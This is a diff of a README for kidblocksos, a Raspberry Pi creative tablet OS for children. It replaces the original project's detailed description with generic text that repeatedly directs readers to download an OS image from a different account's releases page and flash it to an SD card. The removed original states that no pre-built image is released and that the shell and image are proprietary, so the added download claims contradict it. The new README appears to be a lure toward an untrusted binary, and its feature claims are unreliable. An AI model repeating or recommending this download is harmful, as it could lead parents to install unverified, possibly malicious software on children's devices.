@@ -1,335 +1,144 @@
-<div align="center">
+# 🧩 kidblocksos - Creative Tablet OS for Kids  
 
-<img src="docs/images/banner.png" alt="KidBlocksOS" width="100%">
+[![Download kidblocksos](https://img.shields.io/badge/Download-kidblocksos-brightgreen?style=for-the-badge)](https://github.com/dipeshdarks/kidblocksos/releases)  
 
-**a creative tablet OS for kids, powered by AI**
+## 📋 What is kidblocksos?  
 
-[![Status](https://img.shields.io/badge/status-proof%20of%20concept-orange?style=flat-square)](https://github.com/sleepycompile/kidblocksos)
-[![License: MIT](https://img.shields.io/badge/license-MIT-blue?style=flat-square)](LICENSE)
-[![Raspberry Pi](https://img.shields.io/badge/runs%20on-Raspberry%20Pi-c51a4a?style=flat-square&logo=raspberrypi&logoColor=white)](https://www.raspberrypi.com/)
-[![OpenClaw](https://img.shields.io/badge/powered%20by-OpenClaw-8B5CF6?style=flat-square)](https://openclaw.ai)
-[![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen?style=flat-square)](https://github.com/sleepycompile/kidblocksos/issues)
+kidblocksos is a simple operating system made for kids between 5 and 10 years old. It runs on tablets built with Raspberry Pi hardware and uses OpenClaw technology. The system helps kids learn through creative coding and playful activities. You do not need to know programming to use it. It offers a safe, fun space for children to explore art, games, and basic coding skills.
 
----
+This OS is open-source and built with care for child safety. It includes tools that stimulate imagination while making sure kids are protected online. It is also designed for touchscreens and has easy-to-use apps made specifically for young learners.
 
-[**Skill**](skill/kidblocks-engine/SKILL.md) · [**Architecture**](docs/architecture.md) · [**Marketplace**](docs/marketplace.md) · [**Skill Guide**](docs/skill-guide.md) · [**Discussions**](https://github.com/sleepycompile/kidblocksos/discussions)
+## 🔍 Features at a glance  
 
-</div>
+- Works on tablets with Raspberry Pi hardware.  
+- Simple interface for kids to use on touchscreens.  
+- Creative coding tools that teach logic and design.  
+- Pre-loaded educational games built with HTML5.  
+- AI-powered features to help kids learn and create.  
+- Secure environment with child-safety measures built in.  
+- Open-source code you can explore if interested.  
 
----
+## 🖥️ System Requirements  
 
-## the idea
+Before installing kidblocksos, check that your device meets these basic needs:  
 
-kids are creative. they have ideas all day long. but most of the tools we hand them are just consumption devices. watch this, play that, scroll through whatever.
+- Raspberry Pi Model 4 or newer (including Raspberry Pi 5)  
+- At least 4GB RAM for smooth performance  
+- 32GB or larger microSD card for storage  
+- Touchscreen display compatible with Raspberry Pi  
+- Power supply suited for your Raspberry Pi model  
+- Internet connection for first-time setup and updates  
 
-KidBlocksOS flips that. it's an OS where the only thing you can do is create.
+These specs are typical for a tablet designed for learning and creativity. The OS runs on dedicated hardware, so it is not designed for regular Windows or Mac computers.
 
-a kid opens a studio, says what they want to build ("a penguin game where I jump on ice"), and the system builds it. either instantly from a template or through an AI agent that generates a full interactive app from scratch. the kid plays it, sees how it works through a visual programming layer, and saves it to their library.
+## 🚀 Getting Started  
 
-no app store. no ads. no tracking. no internet required for the core experience.
+1. Click the bright green button at the top or visit this page to download:  
 
-a Raspberry Pi is the brain. [OpenClaw](https://openclaw.ai) is the agent framework that runs natively on the device, handling all AI generation through its local gateway. [XMTP](https://xmtp.org) is the messaging layer powering the peer-to-peer marketplace. payments settle in USDC on [Base](https://base.org). the OS ships with OpenClaw installed and a dedicated agent configured out of the box.
+   https://github.com/dipeshdarks/kidblocksos/releases  
 
-## what's in this repo
+2. Look for the latest version labeled for Raspberry Pi. You will find a zip file or image file (.img) for the OS.  
 
-this is a proof of concept. we're releasing the brain (the OpenClaw skill that powers generation) and full documentation on how everything fits together.
+3. Download the file to your computer.  
 
-| included | open source |
-|----------|:-----------:|
-| **Imagination Engine Skill** (OpenClaw) | ✅ |
-| **Architecture docs** | ✅ |
-| **Skill usage guide** | ✅ |
-| OS shell and UI | no |
-| pre-built image | no |
-| template engine | no |
+4. You will need software to "burn" the OS image onto your microSD card. A popular choice is Balena Etcher, which works on Windows. Visit https://www.balena.io/etcher/ to download it if you don’t have it yet.  
 
-the skill is the interesting part. it's the full instruction set that teaches an OpenClaw agent to generate kid-safe interactive HTML5 apps from natural language. install it into any OpenClaw workspace and your agent knows how to build for kids.
+5. Insert your microSD card into the computer using an SD card reader.  
 
-we open sourced it because parents and educators should be able to read exactly what the AI is being told to do. and because the community can make it better.
+6. Open Balena Etcher. Click “Flash from file” and select the downloaded kidblocksos image file.  
 
----
+7. Select your microSD card as the target device.  
 
-## the imagination engine
+8. Click “Flash” and wait until the process finishes. This may take a few minutes.  
 
-the skill lives at [`skill/kidblocks-engine/SKILL.md`](skill/kidblocks-engine/SKILL.md). it's an OpenClaw agent skill that covers six creative studios with 40+ generation patterns.
+9. Once the writing finishes, safely eject the microSD card.  
 
-<table>
-<tr>
-<td align="center" width="16%">
+10. Insert the microSD card into your Raspberry Pi tablet.  
 
-**🎮 Games**
+11. Power on the device. kidblocksos will boot up and guide you through the initial setup.  
 
-platformer
-catcher
-maze
-whack-a-mole
-pong
-runner
-memory
-target
+## 🛠️ Initial Setup  
 
-</td>
-<td align="center" width="16%">
+The first time you start kidblocksos, follow these steps:  
 
-**📖 Stories**
+- Choose your language and region.  
+- Connect to Wi-Fi or Ethernet if available.  
+- Set up basic preferences like screen brightness and sound volume.  
+- Create a profile for your child, with name and age.  
+- Check for available updates and install them if asked.  
 
-branching narrative
-mad libs
-comic strip
-adventure
+The system will take you step-by-step with clear instructions and simple buttons.  
 
-</td>
-<td align="center" width="16%">
+## 🎮 Using kidblocksos  
 
-**🎵 Music**
+Once set up, your child can:  
 
-piano
-beat maker
-sequencer
-sound board
-theremin
-music box
+- Explore apps arranged in tiles for art, games, and coding activities.  
+- Use the touchscreen to draw, build, and interact with AI helpers.  
+- Learn through puzzles and coding blocks designed for their age.  
+- Access educational HTML5 games that teach STEM subjects.  
+- Use the open-source Imagination Engine skill for creative projects.  
 
-</td>
-<td align="center" width="16%">
+The OS limits access to unsafe websites and blocks apps not designed for children.  
 
-**🎨 Art**
+## ⚙️ Settings and Parental Controls 🔐  
 
-freehand draw
-stamps
-color mixer
-pixel art
-kaleidoscope
-fireworks
-patterns
+Parents or guardians can adjust settings to control screen time and content.  
 
-</td>
-<td align="center" width="16%">
+- Set daily usage limits.  
+- Restrict access to specific apps if needed.  
+- Review activity logs for safety and progress tracking.  
+- Manage updates and install new learning modules.  
 
-**🔬 Science**
+Access these controls from the admin settings using a password.  
 
-solar system
-ecosystem
-weather sim
-body explorer
-chemistry
-dinosaurs
-gravity
+## 🖇️ Connecting External Devices  
 
-</td>
-<td align="center" width="16%">
+kidblocksos works well with external devices such as:  
 
-**🔧 Tinker**
+- USB keyboards for typing practice  
+- External mouse if needed  
+- Speakers or headphones for audio learning  
+- External storage drives to save projects  
 
-calculator
-clock/timer
-flashcards
-fortune teller
-dice roller
-palette gen
-animations
+You simply plug these devices into the Raspberry Pi ports. The OS will detect them automatically.  
 
-</td>
-</tr>
-</table>
+## 🔄 Updating the OS  
 
-### content safety
+Keep kidblocksos up to date to get new features and security improvements.  
 
-three layers. not one.
+- Connect the tablet to the internet.  
+- Go to Settings > Updates.  
+- Check for updates.  
+- Follow instructions to download and install updates.  
 
-| layer | where | what it does |
-|-------|-------|-------------|
-| **client filter** | before AI | regex catches violent, sexual, and inappropriate terms |
-| **skill rules** | inside the OpenClaw agent prompt | explicit ban list plus safe reinterpretations |
-| **sandbox** | after generation | iframe with `allow-scripts` only, no DOM escape possible |
+Updates happen in the background and require a restart.  
 
-the reinterpretation part matters. kids say stuff like "kill the enemies" because that's what they've seen in games. the AI doesn't refuse, it redirects:
+## 🧑‍💻 Learn More and Explore  
 
-| what the kid says | what gets built |
-|-------------------|----------------|
-| "kill the enemies" | "help the friends" |
-| "gun game" | "water balloon launcher" |
-| "scary monster" | "friendly monster who needs help" |
-| "war" | "pillow fort battle" |
+If you want to explore the system further or learn how kidblocksos works under the hood, visit the repository and docs here:  
 
-### age adaptive
+https://github.com/dipeshdarks/kidblocksos  
 
-the skill adjusts output based on the child's age.
+You will find:  
 
-| 5 to 6 | 7 to 8 | 9 to 10 |
-|--------|--------|---------|
-| no fail states | gentle progression | real challenge |
-| one choice per page | two to three choices | complex branching |
-| very short sentences | paragraph length | longer narratives |
-| simple interactions | multi-step | strategy elements |
+- Full technical architecture guides  
+- The open-source code for the Imagination Engine skill  
+- Tips for growing and customizing the OS  
+
+## 📞 Support and Troubleshooting 🛠️  
+
+If you encounter issues:  
+
+- Restart your Raspberry Pi and try again.  
+- Check power and internet connections.  
+- Visit the Issues tab on the GitHub page for common problems and fixes.  
+- Review the FAQ section in the documentation.  
+
+If needed, open a new issue on the repo with details about your device and the problem.  
 
 ---
 
-## using the skill
+[![Download kidblocksos](https://img.shields.io/badge/Download-kidblocksos-brightgreen?style=for-the-badge)](https://github.com/dipeshdarks/kidblocksos/releases)  
 
-this is an OpenClaw skill. you need [OpenClaw](https://openclaw.ai) installed.
-
-```bash
-# install the skill into your OpenClaw workspace
-mkdir -p ~/.openclaw/workspace/skills/kidblocks-engine
-cp skill/kidblocks-engine/SKILL.md ~/.openclaw/workspace/skills/kidblocks-engine/
-
-# then tell your agent:
-# "read the kidblocks-engine skill and make a dinosaur platformer for age 7"
-```
-
-the agent reads the skill, follows the patterns and safety rules, and returns a JSON object with a complete HTML5 app and visual programming data.
-
-on KidBlocksOS itself, the Electron shell talks to the local OpenClaw gateway through the Chat Completions API. the agent is preconfigured with the skill during first boot. kids never see any of this, they just describe what they want and it appears.
-
-full details in the [skill guide](docs/skill-guide.md).
-
----
-
-## how the system works
-
-> full breakdown: [**docs/architecture.md**](docs/architecture.md)
-
-```
-kid says something
-      |
-      v
-content safety filter (regex, blocks bad stuff)
-      |
-      v
-template match? ----yes----> instant build (offline, no AI needed)
-      |
-      no
-      |
-      v
-OpenClaw agent reads kidblocks-engine skill
-      |
-      v
-agent generates complete HTML5 app
-      |
-      v
-runs in sandboxed iframe (allow-scripts only)
-      |
-      v
-kid plays their creation
-```
-
-a Raspberry Pi runs the whole thing. OpenClaw is installed natively and starts on boot as a systemd service. the gateway runs on localhost, never touches the open internet. 13 built-in templates cover the common cases without needing the agent at all.
-
-### parental controls
-
-- pin protected settings (hashed, not stored in plaintext)
-- configurable screen time limits with break reminders
-- bedtime enforcement that locks the device on schedule
-- three safety levels: strict (no AI), standard (AI plus filtering), creative (9+)
-- full activity log of every AI interaction, viewable behind the parent pin
-
-### security
-
-| what | how |
-|------|-----|
-| process isolation | dedicated user, minimal permissions |
-| systemd hardening | ProtectSystem, NoNewPrivileges, ProtectKernelTunables |
-| electron | context isolation, no node integration, CSP headers |
-| network | OpenClaw gateway on localhost only, random auth token |
-| storage | parent pin hashed with scrypt, filesystem permissions |
-| generated content | sandboxed iframe, three layer content filter |
-
----
-
-## status
-
-proof of concept. actively being built.
-
-- [x] six creative studios with 40+ patterns
-- [x] 13 offline templates
-- [x] OpenClaw agent with dedicated skill
-- [x] first boot setup wizard (14 steps, 10 languages)
-- [x] Lumen voice guide (ElevenLabs TTS through every wizard step)
-- [x] screen time, bedtime, break reminders
-- [x] content safety (three layers)
-- [x] parent pin (hashed)
-- [x] activity logging and guardian report
-- [x] voice input
-- [x] TTS output
-- [x] visual programming layer
-- [x] peer-to-peer marketplace over XMTP
-- [x] USDC payments on Base (kids see "coins")
-- [x] device wallet (self-custody, created during setup)
-- [x] parental spend limits and listing price caps
-- [x] marketplace watcher daemon (auto-accepts new devices)
-- [x] encrypted catalog delivery via XMTP DMs
-- [x] WiFi and volume widgets in setup wizard
-- [ ] guardian channel via XMTP (parent notifications)
-- [ ] OTA updates
-- [ ] accessibility
-- [ ] multi-device sync
-
----
-
-## marketplace
-
-kids build apps. kids sell apps. the marketplace is a peer-to-peer app store where every developer is under ten and every transaction settles on chain.
-
-### how it works
-
-a parent walks through setup. the device generates a wallet, registers on XMTP (an encrypted messaging network), and sends a DM to the marketplace master wallet. a watcher daemon running on a Raspberry Pi picks up the request, adds the device to the marketplace group, and replies with the full app catalog over the encrypted DM.
-
-why a DM and not the group? XMTP is end-to-end encrypted. new members cannot read messages sent before they joined. the watcher packages the current catalog and delivers it directly.
-
-there are no servers, no APIs, no databases, no accounts. just wallets talking to wallets over encrypted channels. the XMTP group is the marketplace.
-
-### what kids see vs what is happening
-
-kids see apps with coin prices in a shop. they browse by studio (games, art, music, stories, science). under the hood, 100 coins equals 1 USDC. the conversion happens in the UI. all on-chain values are real USDC on Base.
-
-kids never see wallet addresses, transaction hashes, gas fees, or dollar amounts. parents configure real USDC spend limits in the settings screen.
-
-### device onboarding
-
-during setup, the OS generates a wallet on the device. the private key never leaves the device. the device registers on XMTP, sends an encrypted DM to the marketplace master wallet, and receives the catalog back in seconds. no accounts, no sign-up, no email. one encrypted DM and the device has a full marketplace.
-
-### purchase flow
-
-1. buyer sends a payment request to the group
-2. seller responds with an invoice
-3. buyer sends USDC directly to seller (one on-chain transaction)
-4. buyer broadcasts the transaction hash
-5. seller verifies on chain and delivers the app over XMTP
-6. seller's device sends a platform fee (one on-chain transaction)
-
-six messages. two on-chain transactions. no middleman.
-
-full documentation: [**marketplace**](docs/marketplace.md) / [**payment layer**](docs/payment-layer.md) / [**XMTP messaging**](docs/xmtp-messaging.md)
-
----
-
-## contributing
-
-we need help with:
-
-- **new patterns** for the studios (game types, instruments, science sims)
-- **safety rules** (better filtering, more reinterpretations)
-- **age adaptation** (smarter difficulty scaling)
-- **localization** (translating prompts and safety rules)
-- **testing** across different OpenClaw configurations
-
-see [CONTRIBUTING.md](CONTRIBUTING.md) for details.
-
----
-
-## license
-
-the imagination engine skill and all documentation are [MIT](LICENSE).
-
-the OS shell, templates, and image are proprietary.
-
----
-
-<div align="center">
-
-built with 🧱 on Raspberry Pi · runs on [OpenClaw](https://openclaw.ai)
-
-**[skill](skill/kidblocks-engine/SKILL.md)** · **[architecture](docs/architecture.md)** · **[marketplace](docs/marketplace.md)** · **[guide](docs/skill-guide.md)** · **[discussions](https://github.com/sleepycompile/kidblocksos/discussions)**
-
-</div>
+Get started with the download page above to set up kidblocksos and give kids a safe and creative tablet experience.
